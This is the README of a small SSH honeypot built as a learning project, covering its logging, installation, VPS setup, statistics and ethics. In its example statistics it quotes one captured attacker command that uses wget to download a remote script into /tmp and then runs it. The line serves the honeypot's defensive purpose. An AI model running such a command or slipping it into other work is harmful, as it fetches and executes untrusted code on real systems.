# sshpot

Small **SSH honeypot**: a fake SSH server that records everything attackers try (credentials, IP addresses, commands typed), then produces statistics.

It's a **low-interaction** honeypot: the "shell" is fully simulated. **No command is ever really executed** and nothing is downloaded.

## Why I built this

I wanted to see with my own eyes what happens to a server exposed on the Internet: which passwords are tried, where the attacks come from, what bots do once they're "in". A honeypot gives real *threat intelligence* and is a good way to understand the SSH protocol. Cowrie is the reference in this field; sshpot is a minimal version I wrote to learn.

## What gets recorded

| Event | Content |
|---|---|
| `connect` / `disconnect` | source IP and port |
| `client_version` | client software (`SSH-2.0-Go`, `libssh2`… often a bot) |
| `login_failed` / `login_success` | username **and password** tried |
| `pubkey_attempt` | type and fingerprint of the public key offered |
| `command` | every command typed after "logging in" |

Logs use the **JSON Lines** format (one JSON object per line): easy to read with `jq` and to ship into a SIEM (Splunk, Elastic, Wazuh…).

### Behaviour

- The server announces itself as `OpenSSH_8.9p1 Ubuntu`, like a real Ubuntu 22.04 server.
- Most passwords are **rejected**, like on a normal server.
- A few well-known weak credentials (`root:123456`, `admin:admin`, `pi:raspberry`…) are **accepted**, to watch what the attacker does next. The `--accept-all` option accepts everything.
- The fake shell answers believably to `whoami`, `uname -a`, `id`, `ls`, `cat /etc/passwd`, `free`, `uptime`… and `wget`/`curl` "fail" (the URL is still recorded).

## Compatibility

| System | Works? |
|---|---|
| Linux (Ubuntu, Debian, Kali, Fedora…) | Yes (recommended, ideally a dedicated VPS) |
| macOS | Yes |
| Windows 10 / 11 | Yes |
| Docker | Yes (recommended for isolation) |

## Requirements

- **Python 3.9 or newer**
- The **`paramiko`** library (installed automatically by `pip install .`)
- For the `stats` command alone: no dependencies

System packages (Debian/Ubuntu):

```bash
sudo apt install -y python3 python3-pip python3-venv pipx git
```

Optional: `python3-paramiko` (Debian package version) and `jq` (to read the logs).

## Installation

### Debian / Ubuntu / Kali

```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-venv pipx git
git clone https://github.com/aelof1/sshpot.git
cd sshpot
pipx install .
```

### Fedora

```bash
sudo dnf install -y python3 pipx git
```

Then the same `git clone` and `pipx install .` commands.

### macOS

```bash
brew install python pipx git
```

### Windows

Install [Python](https://www.python.org/downloads/) (tick "Add python.exe to PATH"), then in the project folder: `pip install .`

### With Docker (recommended)

```bash
docker build -t sshpot .
docker run -d --name sshpot -p 2222:2222 -v sshpot-data:/data --restart unless-stopped sshpot
docker logs -f sshpot
```

The container runs as an unprivileged user.

## Usage

```bash
sshpot run                            # listen on port 2222
sshpot run --port 2222 --accept-all   # accept every password
sshpot stats                          # statistics from sshpot.jsonl
sshpot stats samples/sample.jsonl     # statistics on the example log
sshpot stats --json --top 20
```

Try it yourself from another window:

```bash
ssh root@127.0.0.1 -p 2222      # password: 123456
```

The server key (`sshpot_host.key`) is generated on first run. It's ignored by Git: don't publish it.

### Example statistics

```
Connections      : 4 from 3 unique IPs
Login attempts   : 9 (2 accepted by the honeypot)

Top 5 passwords:
   123456    2
   1qaz2wsx  1
   P@ssw0rd  1
   ...

Top 5 commands after login:
   uname -a                                     2
   cat /proc/cpuinfo | grep name | wc -l        1
   cd /tmp && wget http://203.0.113.200/x86.sh && chmod +x x86.sh && ./x86.sh   1

Download attempts (malware URLs - do NOT open them):
   203.0.113.200   cd /tmp && wget http://203.0.113.200/x86.sh && ...
```

## Putting it on the Internet (VPS)

To get real attacks you need an exposed machine, ideally a **small dedicated VPS** (a few dollars a month) and **never your own PC or home network**.

1. **Move your real SSH** to another port, for example 22022, in `/etc/ssh/sshd_config` (`Port 22022`). Then `sudo systemctl restart ssh`, and **check that you can log in again** on that port before going further.
2. Run sshpot on port 2222 (no root needed).
3. Redirect port 22 to 2222:

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
```

The first attempts usually arrive within minutes.

### Start at boot (systemd)

`/etc/systemd/system/sshpot.service`:

```ini
[Unit]
Description=sshpot SSH honeypot
After=network.target

[Service]
User=honeypot
WorkingDirectory=/opt/sshpot-data
ExecStart=/usr/local/bin/sshpot run --port 2222 --quiet
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
sudo useradd --system --shell /usr/sbin/nologin honeypot
sudo mkdir -p /opt/sshpot-data && sudo chown honeypot /opt/sshpot-data
sudo systemctl daemon-reload && sudo systemctl enable --now sshpot
```

(Adjust `ExecStart` with the path given by `which sshpot`.)

## Security and ethics

- The fake shell runs **no** commands, but the program is still an exposed service: use a dedicated machine, Docker and an unprivileged user.
- The recorded passwords are the attackers' ones. Never reuse them to log in anywhere.
- **Never open** the captured download URLs: they are often real malware.
- Check your hosting provider's rules and your local laws about collecting this data.

## Project layout

```
sshpot/
├── sshpot/
│   ├── server.py   # SSH server (paramiko)
│   ├── shell.py    # fake shell, hard-coded answers
│   ├── logger.py   # JSON Lines log
│   ├── stats.py    # statistics
│   └── cli.py
├── samples/sample.jsonl
├── Dockerfile
└── tests/
```

## Tests

```bash
pip install pytest
python3 -m pytest
```

The tests cover the fake shell, the log and the statistics. The network part is tested by hand with `ssh root@127.0.0.1 -p 2222`.

## Limitations

- An attentive attacker quickly notices they're not on a real system (no real filesystem).
- No SFTP or file transfer.
- IPv4 only.

## Ideas for later

- Map of attacks by country (IP geolocation)
- Discord alerts when someone "logs in"
- Web dashboard for the statistics

## License

MIT
